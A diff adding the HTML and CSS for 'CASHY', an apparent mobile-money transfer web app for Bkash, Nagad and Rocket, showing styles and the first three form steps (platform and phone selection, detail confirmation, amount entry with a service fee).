@@ -1,0 +1,2594 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CASHY - Secure Money Transfer</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <!-- jsPDF library for PDF receipts -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf-autotable/3.5.28/jspdf.plugin.autotable.min.js"></script>
+    <style>
+        /* ========== RESET & BASE ========== */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+        }
+
+        :root {
+            --primary-green: #10B981;
+            --primary-dark: #047857;
+            --primary-light: #D1FAE5;
+            --accent-teal: #0D9488;
+            --soft-white: #F9FAFB;
+            --card-white: #FFFFFF;
+            --text-dark: #1F2937;
+            --text-muted: #6B7280;
+            --border-light: #E5E7EB;
+            --shadow-sm: 0 1px 2px 0 rgba(0, 0, 0, 0.05);
+            --shadow-md: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
+            --shadow-lg: 0 10px 15px -3px rgba(0, 0, 0, 0.1);
+            --radius-sm: 8px;
+            --radius-md: 12px;
+            --radius-lg: 16px;
+            --radius-xl: 20px;
+            --transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
+            --spacing-xs: 8px;
+            --spacing-sm: 16px;
+            --spacing-md: 24px;
+            --spacing-lg: 32px;
+            --spacing-xl: 40px;
+        }
+
+        body {
+            background: linear-gradient(135deg, #F0F9FF 0%, #F0FDF4 100%);
+            color: var(--text-dark);
+            line-height: 1.6;
+            min-height: 100vh;
+            padding: var(--spacing-sm);
+        }
+
+        .hidden {
+            display: none !important;
+        }
+
+        /* ========== TYPOGRAPHY ========== */
+        h1, h2, h3, h4 {
+            font-weight: 600;
+            line-height: 1.3;
+            margin-bottom: var(--spacing-sm);
+        }
+
+        h1 {
+            font-size: 36px;
+            font-weight: 800;
+            letter-spacing: -0.5px;
+        }
+
+        h2 {
+            font-size: 28px;
+            font-weight: 700;
+            color: var(--text-dark);
+            margin-bottom: var(--spacing-md);
+        }
+
+        h3 {
+            font-size: 20px;
+            font-weight: 600;
+            color: var(--text-dark);
+            margin-bottom: var(--spacing-sm);
+        }
+
+        .text-muted {
+            color: var(--text-muted);
+            font-size: 14px;
+            line-height: 1.5;
+        }
+
+        /* ========== APP CONTAINER ========== */
+        .app-container {
+            max-width: 480px;
+            margin: 0 auto;
+            background: var(--card-white);
+            border-radius: var(--radius-xl);
+            box-shadow: var(--shadow-lg);
+            overflow: hidden;
+            min-height: calc(100vh - 32px);
+            position: relative;
+        }
+
+        /* ========== HEADER ========== */
+        .app-header {
+            background: linear-gradient(135deg, var(--primary-dark) 0%, var(--primary-green) 100%);
+            color: white;
+            padding: var(--spacing-lg) var(--spacing-md);
+            text-align: center;
+            position: relative;
+        }
+
+        .app-header h1 {
+            font-size: 40px;
+            font-weight: 900;
+            margin-bottom: var(--spacing-xs);
+            letter-spacing: 1px;
+            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+
+        .app-subtitle {
+            font-size: 18px;
+            opacity: 0.95;
+            font-weight: 500;
+            margin-bottom: var(--spacing-xs);
+        }
+
+        .app-byline {
+            font-size: 14px;
+            opacity: 0.8;
+            font-weight: 400;
+        }
+
+        .admin-btn {
+            position: absolute;
+            top: 24px;
+            right: 24px;
+            background: rgba(255, 255, 255, 0.15);
+            color: white;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            padding: 10px 18px;
+            border-radius: var(--radius-md);
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: var(--transition);
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            backdrop-filter: blur(10px);
+        }
+
+        .admin-btn:hover {
+            background: rgba(255, 255, 255, 0.25);
+            transform: translateY(-1px);
+        }
+
+        /* ========== CONTENT AREA ========== */
+        .content {
+            padding: var(--spacing-xl) var(--spacing-md);
+        }
+
+        .step {
+            display: none;
+            animation: fadeIn 0.4s ease-out;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .step.active {
+            display: block;
+        }
+
+        /* ========== FORM CONTROLS ========== */
+        .form-group {
+            margin-bottom: var(--spacing-lg);
+        }
+
+        .form-label {
+            display: block;
+            font-size: 15px;
+            font-weight: 600;
+            color: var(--text-dark);
+            margin-bottom: var(--spacing-sm);
+            padding-left: 4px;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 18px 20px;
+            border: 2px solid var(--border-light);
+            border-radius: var(--radius-md);
+            font-size: 16px;
+            transition: var(--transition);
+            background: var(--soft-white);
+            color: var(--text-dark);
+        }
+
+        .input-field::placeholder {
+            color: var(--text-muted);
+            opacity: 0.7;
+        }
+
+        .input-field:focus {
+            outline: none;
+            border-color: var(--primary-green);
+            background: white;
+            box-shadow: 0 0 0 4px rgba(16, 185, 129, 0.15);
+        }
+
+        .error-message {
+            color: #EF4444;
+            font-size: 14px;
+            margin-top: var(--spacing-xs);
+            min-height: 22px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding-left: 4px;
+        }
+
+        /* ========== PLATFORM SELECTION ========== */
+        .platform-section {
+            margin-bottom: var(--spacing-xl);
+        }
+
+        .platform-section h3 {
+            font-size: 18px;
+            margin-bottom: var(--spacing-md);
+            color: var(--text-dark);
+        }
+
+        .platform-options {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: var(--spacing-sm);
+            margin-top: var(--spacing-sm);
+        }
+
+        .platform-option {
+            background: var(--soft-white);
+            border: 2px solid var(--border-light);
+            border-radius: var(--radius-md);
+            padding: 20px 12px;
+            text-align: center;
+            cursor: pointer;
+            transition: var(--transition);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .platform-option:hover {
+            border-color: var(--primary-green);
+            transform: translateY(-2px);
+            box-shadow: var(--shadow-sm);
+        }
+
+        .platform-option.selected {
+            background: var(--primary-light);
+            border-color: var(--primary-green);
+            box-shadow: 0 0 0 3px rgba(16, 185, 129, 0.2);
+            transform: translateY(-1px);
+        }
+
+        .platform-name {
+            font-size: 16px;
+            font-weight: 600;
+            color: var(--text-dark);
+        }
+
+        /* ========== TERMS & CONDITIONS ========== */
+        .terms-card {
+            background: var(--soft-white);
+            border-radius: var(--radius-lg);
+            padding: var(--spacing-lg);
+            margin: var(--spacing-xl) 0;
+            border: 1px solid var(--border-light);
+        }
+
+        .terms-card h3 {
+            margin-bottom: var(--spacing-md);
+            color: var(--primary-dark);
+            font-size: 18px;
+            font-weight: 700;
+        }
+
+        .terms-list {
+            list-style: none;
+        }
+
+        .terms-list li {
+            font-size: 15px;
+            color: var(--text-muted);
+            margin-bottom: var(--spacing-sm);
+            padding-left: 26px;
+            position: relative;
+            line-height: 1.6;
+        }
+
+        .terms-list li:before {
+            content: "•";
+            color: var(--primary-green);
+            font-size: 24px;
+            position: absolute;
+            left: 0;
+            top: -2px;
+        }
+
+        /* ========== BUTTONS ========== */
+        .button-group {
+            display: flex;
+            gap: var(--spacing-sm);
+            margin-top: var(--spacing-xl);
+        }
+
+        .btn {
+            flex: 1;
+            padding: 18px 24px;
+            border: none;
+            border-radius: var(--radius-md);
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: var(--transition);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            text-decoration: none;
+        }
+
+        .btn-primary {
+            background: linear-gradient(135deg, var(--primary-green) 0%, var(--accent-teal) 100%);
+            color: white;
+            box-shadow: 0 4px 6px rgba(16, 185, 129, 0.25);
+        }
+
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 12px rgba(16, 185, 129, 0.3);
+        }
+
+        .btn-primary:active {
+            transform: translateY(0);
+        }
+
+        .btn-secondary {
+            background: var(--soft-white);
+            color: var(--text-muted);
+            border: 2px solid var(--border-light);
+        }
+
+        .btn-secondary:hover {
+            background: white;
+            border-color: var(--primary-green);
+            color: var(--text-dark);
+            transform: translateY(-1px);
+        }
+
+        .btn-success {
+            background: linear-gradient(135deg, #059669 0%, #047857 100%);
+            color: white;
+            box-shadow: 0 4px 6px rgba(5, 150, 105, 0.25);
+        }
+
+        .btn-success:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 12px rgba(5, 150, 105, 0.3);
+        }
+
+        .btn-danger {
+            background: linear-gradient(135deg, #DC2626 0%, #B91C1C 100%);
+            color: white;
+        }
+
+        .btn-warning {
+            background: linear-gradient(135deg, #F59E0B 0%, #D97706 100%);
+            color: white;
+        }
+
+        .btn-urgent {
+            background: linear-gradient(135deg, #7C3AED 0%, #6D28D9 100%);
+            color: white;
+            box-shadow: 0 4px 6px rgba(124, 58, 237, 0.25);
+        }
+
+        .btn-urgent:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 12px rgba(124, 58, 237, 0.3);
+        }
+
+        /* ========== DETAILS CARD ========== */
+        .details-card {
+            background: var(--soft-white);
+            border-radius: var(--radius-lg);
+            padding: var(--spacing-lg);
+            margin-bottom: var(--spacing-xl);
+            border: 1px solid var(--border-light);
+        }
+
+        .detail-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: var(--spacing-md) 0;
+            border-bottom: 1px solid var(--border-light);
+        }
+
+        .detail-row:last-child {
+            border-bottom: none;
+        }
+
+        .detail-label {
+            font-size: 15px;
+            color: var(--text-muted);
+            font-weight: 500;
+        }
+
+        .detail-value {
+            display: flex;
+            align-items: center;
+            gap: var(--spacing-sm);
+            font-weight: 600;
+            font-size: 16px;
+        }
+
+        .platform-badge {
+            background: var(--primary-green);
+            color: white;
+            padding: 6px 16px;
+            border-radius: 20px;
+            font-size: 13px;
+            font-weight: 700;
+            letter-spacing: 0.3px;
+        }
+
+        /* ========== AMOUNT SECTION ========== */
+        .amount-input-wrapper {
+            position: relative;
+            margin-bottom: var(--spacing-sm);
+        }
+
+        .currency-prefix {
+            position: absolute;
+            left: 20px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 20px;
+            font-weight: 600;
+            color: var(--text-dark);
+        }
+
+        #amount {
+            padding-left: 70px;
+            font-size: 28px;
+            font-weight: 700;
+            text-align: right;
+            background: white;
+            color: var(--text-dark);
+        }
+
+        .amount-details {
+            background: var(--soft-white);
+            border-radius: var(--radius-lg);
+            padding: var(--spacing-lg);
+            margin: var(--spacing-xl) 0;
+            border: 1px solid var(--border-light);
+        }
+
+        .amount-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: var(--spacing-md) 0;
+            font-size: 16px;
+        }
+
+        .amount-row.total {
+            border-top: 2px solid var(--border-light);
+            margin-top: var(--spacing-md);
+            padding-top: var(--spacing-lg);
+            font-weight: 800;
+            font-size: 20px;
+            color: var(--primary-dark);
+        }
+
+        .notification {
+            background: linear-gradient(135deg, #ECFDF5 0%, #F0F9FF 100%);
+            border: 2px solid #A7F3D0;
+            border-radius: var(--radius-lg);
+            padding: var(--spacing-lg);
+            margin: var(--spacing-xl) 0;
+            display: flex;
+            align-items: flex-start;
+            gap: var(--spacing-md);
+        }
+
+        .notification i {
+            color: var(--primary-green);
+            font-size: 22px;
+            margin-top: 2px;
+        }
+
+        .notification p {
+            font-size: 15px;
+            color: var(--primary-dark);
+            line-height: 1.6;
+        }
+
+        /* ========== PAYMENT INSTRUCTIONS ========== */
+        .payment-card {
+            background: var(--soft-white);
+            border-radius: var(--radius-lg);
+            padding: var(--spacing-xl);
+            margin-bottom: var(--spacing-xl);
+            border: 1px solid var(--border-light);
+        }
+
+        .instruction-alert {
+            background: white;
+            border-left: 4px solid var(--primary-green);
+            padding: var(--spacing-lg);
+            margin-bottom: var(--spacing-lg);
+            border-radius: 0 var(--radius-md) var(--radius-md) 0;
+        }
+
+        .instruction-alert p {
+            font-size: 16px;
+            color: var(--text-dark);
+            margin-bottom: var(--spacing-sm);
+            font-weight: 600;
+        }
+
+        .highlight-number, .highlight-amount {
+            font-size: 28px;
+            font-weight: 800;
+            text-align: center;
+            margin-top: var(--spacing-md);
+            padding: 18px;
+            background: linear-gradient(135deg, var(--primary-green) 0%, var(--accent-teal) 100%);
+            color: white;
+            border-radius: var(--radius-md);
+            letter-spacing: 0.5px;
+            text-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
+        }
+
+        .instruction-steps {
+            margin: var(--spacing-xl) 0;
+        }
+
+        .instruction-steps h3 {
+            margin-bottom: var(--spacing-lg);
+            color: var(--primary-dark);
+            font-size: 20px;
+        }
+
+        .instruction-steps ol {
+            padding-left: var(--spacing-lg);
+        }
+
+        .instruction-steps li {
+            margin-bottom: var(--spacing-md);
+            color: var(--text-dark);
+            line-height: 1.6;
+            font-size: 15px;
+            padding-left: var(--spacing-sm);
+        }
+
+        .transaction-id-card {
+            background: white;
+            border: 2px dashed var(--primary-light);
+            border-radius: var(--radius-lg);
+            padding: var(--spacing-lg);
+            text-align: center;
+            margin-top: var(--spacing-xl);
+        }
+
+        .transaction-id-card p:first-child {
+            font-size: 18px;
+            font-weight: 700;
+            margin-bottom: var(--spacing-sm);
+            color: var(--text-dark);
+        }
+
+        #transactionId {
+            font-family: 'Monaco', 'Menlo', 'Ubuntu Mono', monospace;
+            font-size: 24px;
+            letter-spacing: 1.5px;
+            color: var(--primary-green);
+            font-weight: 700;
+            margin: var(--spacing-sm) 0;
+            padding: 10px;
+            background: var(--primary-light);
+            border-radius: var(--radius-sm);
+            display: inline-block;
+        }
+
+        .text-sm {
+            font-size: 14px;
+            color: var(--text-muted);
+            line-height: 1.5;
+            margin-top: var(--spacing-sm);
+        }
+
+        /* ========== VERIFICATION SCREEN ========== */
+        .verification-alert {
+            background: linear-gradient(135deg, #FFFBEB 0%, #FEF3C7 100%);
+            border: 2px solid #FBBF24;
+            border-radius: var(--radius-lg);
+            padding: var(--spacing-lg);
+            margin-bottom: var(--spacing-xl);
+            display: flex;
+            align-items: flex-start;
+            gap: var(--spacing-md);
+        }
+
+        .verification-alert i {
+            color: #D97706;
+            font-size: 22px;
+            margin-top: 2px;
+        }
+
+        .verification-alert p {
+            color: #92400E;
+            font-size: 15px;
+            line-height: 1.6;
+        }
+
+        .verification-loader {
+            text-align: center;
+            margin: var(--spacing-xl) 0;
+        }
+
+        .loader {
+            border: 4px solid var(--soft-white);
+            border-top: 4px solid var(--primary-green);
+            border-radius: 50%;
+            width: 80px;
+            height: 80px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto var(--spacing-md);
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .transaction-details {
+            background: var(--soft-white);
+            border-radius: var(--radius-lg);
+            padding: var(--spacing-lg);
+            margin-bottom: var(--spacing-xl);
+            border: 1px solid var(--border-light);
+        }
+
+        .support-info {
+            text-align: center;
+            color: var(--text-muted);
+            font-size: 15px;
+            padding: var(--spacing-lg);
+            border-top: 1px solid var(--border-light);
+            margin-top: var(--spacing-xl);
+        }
+
+        /* ========== URGENT CONTACT ========== */
+        .urgent-contact {
+            margin: var(--spacing-xl) 0;
+            text-align: center;
+        }
+
+        .urgent-contact .btn {
+            max-width: 300px;
+            margin: 0 auto;
+        }
+
+        /* ========== YOUTUBE VIDEO CONTAINER ========== */
+        .video-container {
+            margin: var(--spacing-xl) 0;
+            border-radius: var(--radius-lg);
+            overflow: hidden;
+            box-shadow: var(--shadow-md);
+        }
+
+        .video-container iframe {
+            width: 100%;
+            height: 260px;
+            border: none;
+        }
+
+        /* ========== TICKET FORM ========== */
+        .ticket-form {
+            background: var(--soft-white);
+            border-radius: var(--radius-lg);
+            padding: var(--spacing-xl);
+            margin: var(--spacing-xl) 0;
+            border: 1px solid var(--border-light);
+        }
+
+        .ticket-form h3 {
+            margin-bottom: var(--spacing-lg);
+            color: var(--primary-dark);
+            font-size: 20px;
+        }
+
+        .ticket-input {
+            width: 100%;
+            padding: 16px 20px;
+            border: 2px solid var(--border-light);
+            border-radius: var(--radius-md);
+            font-size: 16px;
+            margin-bottom: var(--spacing-md);
+            transition: var(--transition);
+            background: white;
+        }
+
+        .ticket-input:focus {
+            outline: none;
+            border-color: var(--primary-green);
+            box-shadow: 0 0 0 3px rgba(16, 185, 129, 0.15);
+        }
+
+        textarea.ticket-input {
+            min-height: 120px;
+            resize: vertical;
+            font-family: inherit;
+            line-height: 1.5;
+        }
+
+        /* ========== SUCCESS PAGE ========== */
+        .success-page {
+            text-align: center;
+            padding: var(--spacing-xl) 0;
+        }
+
+        .success-icon {
+            width: 120px;
+            height: 120px;
+            background: var(--primary-light);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto var(--spacing-lg);
+            color: var(--primary-dark);
+            font-size: 56px;
+            box-shadow: 0 4px 12px rgba(16, 185, 129, 0.2);
+        }
+
+        .success-actions {
+            margin-top: var(--spacing-xl);
+        }
+
+        /* ========== MODALS ========== */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.5);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            padding: var(--spacing-md);
+            backdrop-filter: blur(8px);
+        }
+
+        .modal-overlay.active {
+            display: flex;
+            animation: fadeIn 0.3s ease-out;
+        }
+
+        .modal {
+            background: white;
+            border-radius: var(--radius-xl);
+            padding: var(--spacing-xl);
+            max-width: 440px;
+            width: 100%;
+            box-shadow: var(--shadow-lg);
+            text-align: center;
+        }
+
+        .modal-icon {
+            width: 100px;
+            height: 100px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto var(--spacing-lg);
+            font-size: 42px;
+        }
+
+        .modal-icon.success {
+            background: var(--primary-light);
+            color: var(--primary-dark);
+        }
+
+        .modal h3 {
+            font-size: 28px;
+            margin-bottom: var(--spacing-md);
+            color: var(--text-dark);
+        }
+
+        .modal p {
+            color: var(--text-muted);
+            margin-bottom: var(--spacing-lg);
+            line-height: 1.6;
+            font-size: 16px;
+        }
+
+        .modal-details {
+            background: var(--soft-white);
+            border-radius: var(--radius-lg);
+            padding: var(--spacing-lg);
+            margin: var(--spacing-lg) 0;
+            text-align: left;
+        }
+
+        .modal-details p {
+            margin-bottom: var(--spacing-sm);
+            color: var(--text-dark);
+            font-size: 15px;
+            line-height: 1.5;
+        }
+
+        /* ========== ADMIN PANEL ========== */
+        .admin-container {
+            background: white;
+            min-height: 100vh;
+        }
+
+        .admin-header {
+            background: linear-gradient(135deg, var(--primary-dark) 0%, var(--primary-green) 100%);
+            color: white;
+            padding: var(--spacing-lg) var(--spacing-md);
+            text-align: center;
+            position: relative;
+            margin-bottom: var(--spacing-xl);
+        }
+
+        .admin-header h1 {
+            font-size: 36px;
+            font-weight: 800;
+        }
+
+        .back-btn {
+            position: absolute;
+            top: 24px;
+            left: 24px;
+            background: rgba(255, 255, 255, 0.15);
+            color: white;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            padding: 10px 18px;
+            border-radius: var(--radius-md);
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: var(--transition);
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            backdrop-filter: blur(10px);
+        }
+
+        .back-btn:hover {
+            background: rgba(255, 255, 255, 0.25);
+            transform: translateY(-1px);
+        }
+
+        .admin-content {
+            padding: 0 var(--spacing-md) var(--spacing-xl);
+        }
+
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: var(--spacing-md);
+            margin-bottom: var(--spacing-xl);
+        }
+
+        .stat-card {
+            background: var(--soft-white);
+            border-radius: var(--radius-lg);
+            padding: var(--spacing-lg);
+            text-align: center;
+            border: 1px solid var(--border-light);
+            transition: var(--transition);
+        }
+
+        .stat-card:hover {
+            transform: translateY(-3px);
+            box-shadow: var(--shadow-md);
+        }
+
+        .stat-number {
+            font-size: 32px;
+            font-weight: 800;
+            color: var(--primary-dark);
+            margin-bottom: var(--spacing-xs);
+        }
+
+        .stat-label {
+            font-size: 14px;
+            color: var(--text-muted);
+            font-weight: 600;
+        }
+
+        .transactions-table {
+            background: var(--soft-white);
+            border-radius: var(--radius-lg);
+            overflow: hidden;
+            margin-bottom: var(--spacing-xl);
+            border: 1px solid var(--border-light);
+            max-height: 500px;
+            overflow-y: auto;
+        }
+
+        .table-container {
+            overflow-x: auto;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            min-width: 800px;
+        }
+
+        th {
+            background: var(--card-white);
+            padding: 18px 20px;
+            text-align: left;
+            font-weight: 700;
+            color: var(--text-dark);
+            font-size: 14px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            border-bottom: 2px solid var(--border-light);
+            position: sticky;
+            top: 0;
+            z-index: 10;
+        }
+
+        td {
+            padding: 18px 20px;
+            border-bottom: 1px solid var(--border-light);
+            color: var(--text-dark);
+            font-size: 15px;
+        }
+
+        tr:hover {
+            background: rgba(16, 185, 129, 0.05);
+        }
+
+        .status-badge {
+            padding: 8px 16px;
+            border-radius: 20px;
+            font-size: 13px;
+            font-weight: 700;
+            display: inline-block;
+        }
+
+        .status-pending {
+            background: #FEF3C7;
+            color: #92400E;
+        }
+
+        .status-verified {
+            background: #D1FAE5;
+            color: #065F46;
+        }
+
+        .action-btn {
+            background: var(--primary-green);
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: var(--radius-md);
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: var(--transition);
+        }
+
+        .action-btn:hover {
+            background: var(--primary-dark);
+            transform: translateY(-2px);
+            box-shadow: 0 4px 6px rgba(16, 185, 129, 0.25);
+        }
+
+        .action-btn:disabled {
+            background: var(--border-light);
+            color: var(--text-muted);
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+
+        /* ========== PASSWORD MODAL ========== */
+        .password-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.5);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 2000;
+            padding: var(--spacing-md);
+            backdrop-filter: blur(8px);
+        }
+
+        .password-modal.active {
+            display: flex;
+        }
+
+        .password-box {
+            background: white;
+            border-radius: var(--radius-xl);
+            padding: var(--spacing-xl);
+            max-width: 440px;
+            width: 100%;
+            box-shadow: var(--shadow-lg);
+            text-align: center;
+        }
+
+        .password-box h2 {
+            margin-bottom: var(--spacing-lg);
+            color: var(--text-dark);
+            font-size: 28px;
+        }
+
+        .password-input {
+            width: 100%;
+            padding: 18px 20px;
+            border: 2px solid var(--border-light);
+            border-radius: var(--radius-md);
+            font-size: 18px;
+            text-align: center;
+            letter-spacing: 3px;
+            margin-bottom: var(--spacing-md);
+            background: var(--soft-white);
+            transition: var(--transition);
+            font-weight: 600;
+        }
+
+        .password-input:focus {
+            outline: none;
+            border-color: var(--primary-green);
+            background: white;
+            box-shadow: 0 0 0 4px rgba(16, 185, 129, 0.15);
+        }
+
+        .password-error {
+            color: #EF4444;
+            font-size: 14px;
+            margin-bottom: var(--spacing-md);
+            min-height: 22px;
+            font-weight: 500;
+        }
+
+        /* ========== RESPONSIVE ========== */
+        @media (max-width: 480px) {
+            body {
+                padding: var(--spacing-xs);
+            }
+            
+            .app-container {
+                min-height: calc(100vh - 16px);
+            }
+            
+            .content, .admin-content {
+                padding: var(--spacing-lg) var(--spacing-sm);
+            }
+            
+            .platform-options {
+                grid-template-columns: 1fr;
+            }
+            
+            .stats-grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
+            
+            .button-group {
+                flex-direction: column;
+            }
+            
+            .btn {
+                width: 100%;
+            }
+            
+            table {
+                min-width: 100%;
+            }
+            
+            th, td {
+                padding: var(--spacing-md) var(--spacing-sm);
+            }
+            
+            .video-container iframe {
+                height: 220px;
+            }
+            
+            h1 {
+                font-size: 32px;
+            }
+            
+            h2 {
+                font-size: 24px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Main Application -->
+    <div class="app-container" id="mainApp">
+        <header class="app-header">
+            <button class="admin-btn" onclick="showPasswordModal()">
+                <i class="fas fa-lock"></i> Admin
+            </button>
+            <h1>CASHY</h1>
+            <div class="app-subtitle">Secure Money Transfer</div>
+            <div class="app-byline">by MAVEN technologies</div>
+        </header>
+
+        <main class="content">
+            <!-- Step 1: Platform Selection -->
+            <div id="step1" class="step active">
+                <h2>Select Platforms</h2>
+                
+                <div class="form-group">
+                    <label class="form-label">Your Phone Number</label>
+                    <input type="tel" id="senderPhone" class="input-field" placeholder="01XXXXXXXXX" maxlength="11">
+                    <div class="error-message" id="senderPhoneError"></div>
+                </div>
+
+                <div class="platform-section">
+                    <h3>Select Sending Platform</h3>
+                    <div class="platform-options">
+                        <div class="platform-option" data-platform="bkash" data-type="sender">
+                            <i class="fas fa-mobile-alt fa-2x" style="color: #E2136E;"></i>
+                            <span class="platform-name">Bkash</span>
+                        </div>
+                        <div class="platform-option" data-platform="nagad" data-type="sender">
+                            <i class="fas fa-wallet fa-2x" style="color: #F8B319;"></i>
+                            <span class="platform-name">Nagad</span>
+                        </div>
+                        <div class="platform-option" data-platform="rocket" data-type="sender">
+                            <i class="fas fa-rocket fa-2x" style="color: #6B46C1;"></i>
+                            <span class="platform-name">Rocket</span>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">Recipient Phone Number</label>
+                    <input type="tel" id="recipientPhone" class="input-field" placeholder="01XXXXXXXXX" maxlength="11">
+                    <div class="error-message" id="recipientPhoneError"></div>
+                </div>
+
+                <div class="platform-section">
+                    <h3>Select Receiving Platform</h3>
+                    <div class="platform-options">
+                        <div class="platform-option" data-platform="bkash" data-type="receiver">
+                            <i class="fas fa-mobile-alt fa-2x" style="color: #E2136E;"></i>
+                            <span class="platform-name">Bkash</span>
+                        </div>
+                        <div class="platform-option" data-platform="nagad" data-type="receiver">
+                            <i class="fas fa-wallet fa-2x" style="color: #F8B319;"></i>
+                            <span class="platform-name">Nagad</span>
+                        </div>
+                        <div class="platform-option" data-platform="rocket" data-type="receiver">
+                            <i class="fas fa-rocket fa-2x" style="color: #6B46C1;"></i>
+                            <span class="platform-name">Rocket</span>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="terms-card">
+                    <h3>Terms and Conditions</h3>
+                    <ul class="terms-list">
+                        <li>CASHY acts solely as an intermediary platform for money transfers</li>
+                        <li>We are not liable for losses from incorrect recipient information</li>
+                        <li>All transactions are final and irreversible</li>
+                        <li>Users must comply with local money transfer regulations</li>
+                    </ul>
+                </div>
+
+                <div class="button-group">
+                    <button class="btn btn-primary" onclick="validateStep1()">
+                        <i class="fas fa-arrow-right"></i> Continue
+                    </button>
+                </div>
+            </div>
+
+            <!-- Step 2: Details Confirmation -->
+            <div id="step2" class="step">
+                <h2>Confirm Details</h2>
+                
+                <div class="details-card">
+                    <div class="detail-row">
+                        <span class="detail-label">Sending From</span>
+                        <div class="detail-value">
+                            <span id="senderPlatformDisplay" class="platform-badge">Bkash</span>
+                            <span id="senderPhoneDisplay">01716900948</span>
+                        </div>
+                    </div>
+                    
+                    <div class="detail-row">
+                        <span class="detail-label">Receiving To</span>
+                        <div class="detail-value">
+                            <span id="receiverPlatformDisplay" class="platform-badge">Nagad</span>
+                            <span id="receiverPhoneDisplay">01716900948</span>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="terms-card">
+                    <h3>Terms and Conditions</h3>
+                    <ul class="terms-list">
+                        <li>CASHY acts solely as an intermediary platform for money transfers</li>
+                        <li>We are not liable for losses from incorrect recipient information</li>
+                        <li>All transactions are final and irreversible</li>
+                        <li>Users must comply with local money transfer regulations</li>
+                    </ul>
+                </div>
+
+                <div class="button-group">
+                    <button class="btn btn-secondary" onclick="goToStep(1)">
+                        <i class="fas fa-arrow-left"></i> Back
+                    </button>
+                    <button class="btn btn-primary" onclick="goToStep(3)">
+                        <i class="fas fa-arrow-right"></i> Continue
+                    </button>
+                </div>
+            </div>
+
+            <!-- Step 3: Amount Entry -->
+            <div id="step3" class="step">
+                <h2>Enter Amount</h2>
+                
+                <div class="form-group">
+                    <label class="form-label">Amount to Transfer (BDT)</label>
+                    <div class="amount-input-wrapper">
+                        <span class="currency-prefix">৳</span>
+                        <input type="number" id="amount" class="input-field" placeholder="0" min="10" max="50000">
+                    </div>
+                    <div class="error-message" id="amountError"></div>
+                </div>
+
+                <div class="amount-details">
+                    <div class="amount-row">
+                        <span>Transfer Amount:</span>
+                        <span id="amountDisplay">0 BDT</span>
+                    </div>
+                    <div class="amount-row">
+                        <span>Service Fee (1.05%):</span>
+                        <span id="feeDisplay">0 BDT</span>
+                    </div>
+                    <div class="amount-row total">
+                        <span>Total to Pay:</span>
+                        <span id="totalDisplay">0 BDT</span>
+                    </div>
+                </div>
+
+                <div class="notification">
+                    <i class="fas fa-info-circle"></i>
+                    <p>The total amount includes our service fee which helps us maintain and improve our service. The recipient will receive the exact transfer amount you entered above.</p>
+                </div>
+
+                <div class="button-group">
+                    <button class="btn btn-secondary" onclick="goToStep(2)">
+                        <i class="fas fa-arrow-left"></i> Back
+                    </button>
+                    <button class="btn btn-primary" onclick="validateAmount()">
+                        <i class="fas fa-arrow-right"></i> Continue
+                    </button>
+                </div>
+            </div>
+
